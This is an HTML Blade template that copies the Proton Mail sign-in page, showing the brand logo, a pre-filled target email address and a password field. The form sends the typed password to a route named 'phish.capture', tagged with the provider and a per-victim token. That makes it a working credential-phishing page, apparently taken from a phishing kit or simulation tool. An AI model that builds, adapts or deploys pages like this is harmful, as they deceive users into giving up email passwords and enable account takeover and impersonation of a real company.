<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>Proton Mail - Login</title>
    <link rel="icon" href="https://proton.me/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#1c1c1e;border-radius:16px;padding:48px 40px;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.3);text-align:center}
        .logo-section{margin-bottom:28px}
        .logo-section svg{height:40px;width:auto}
        h1{font-size:24px;font-weight:700;color:#f5f5f7;margin-bottom:8px}
        .sub{font-size:14px;color:#86868b;margin-bottom:28px;line-height:1.4}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#2c2c2e;border-radius:10px;margin-bottom:24px;text-align:left}
        .email-display .icon{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#6d4aff,#4400cc);display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;margin-right:12px;flex-shrink:0}
        .email-display .text{font-size:14px;color:#f5f5f7;font-weight:500}
        .form-group{text-align:left;margin-bottom:16px;position:relative}
        .form-group label{display:block;font-size:13px;color:#86868b;margin-bottom:6px;font-weight:600}
        .form-group input{width:100%;height:48px;padding:0 48px 0 16px;font-size:15px;color:#f5f5f7;background:#2c2c2e;border:1px solid #38383a;border-radius:10px;outline:none;transition:border-color .2s}
        .form-group input:focus{border-color:#6d4aff}
        .form-group input::placeholder{color:#636366}
        .eye-btn{position:absolute;right:8px;top:34px;background:none;border:none;cursor:pointer;color:#636366;padding:8px}
        .eye-btn svg{width:18px;height:18px}
        .btn-login{width:100%;height:48px;background:linear-gradient(135deg,#6d4aff,#5030cc);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:opacity .15s;margin-top:8px}
        .btn-login:hover{opacity:.9}
        .btn-login:active{opacity:.8}
        .links{margin-top:20px;display:flex;flex-direction:column;gap:10px;align-items:center}
        .links a{font-size:14px;color:#6d4aff;text-decoration:none}
        .links a:hover{text-decoration:underline}
        .divider{display:flex;align-items:center;margin:24px 0}
        .divider::before,.divider::after{content:'';flex:1;height:1px;background:#38383a}
        .divider span{padding:0 12px;font-size:12px;color:#636366}
        .sso-btn{width:100%;height:44px;border:1px solid #38383a;border-radius:10px;background:transparent;display:flex;align-items:center;justify-content:center;gap:10px;font-size:14px;font-weight:500;color:#f5f5f7;cursor:pointer;transition:background .15s}
        .sso-btn:hover{background:#2c2c2e}
        .sso-btn svg{width:18px;height:18px;fill:#f5f5f7}
        .footer{margin-top:24px;font-size:11px;color:#636366}
        .footer a{color:#636366;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:32px 24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo-section">
            <svg viewBox="0 0 200 40" xmlns="http://www.w3.org/2000/svg">
                <circle cx="20" cy="20" r="18" fill="#6d4aff"/>
                <path d="M20 8 L32 14 L32 26 L20 32 L8 26 L8 14 Z" fill="none" stroke="#fff" stroke-width="2"/>
                <text x="44" y="28" font-family="Inter,sans-serif" font-size="22" font-weight="700" fill="#f5f5f7">Proton Mail</text>
            </svg>
        </div>

        <h1>Sign in</h1>
        <p class="sub">Enter your Proton Mail credentials to access your encrypted inbox.</p>

        <div class="email-display">
            <div class="icon">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'protonmail', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required autofocus>
                <button type="button" class="eye-btn" onclick="togglePw()">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                </button>
            </div>

            <button type="submit" class="btn-login">Sign in</button>
        </form>

        <div class="links">
            <a href="#">Forgot password?</a>
            <a href="#">Create a Proton Account</a>
        </div>

        <div class="divider"><span>or</span></div>

        <button class="sso-btn">
            <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
            Sign in with Google
        </button>

        <div class="footer">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <div style="margin-top:8px">© 2026 Proton AG</div>
        </div>
    </div>

    <script>
        function togglePw() {
            var inp = document.getElementById('password');
            if (inp.type === 'password') inp.type = 'text';
            else inp.type = 'password';
        }
    </script>
</body>
</html>
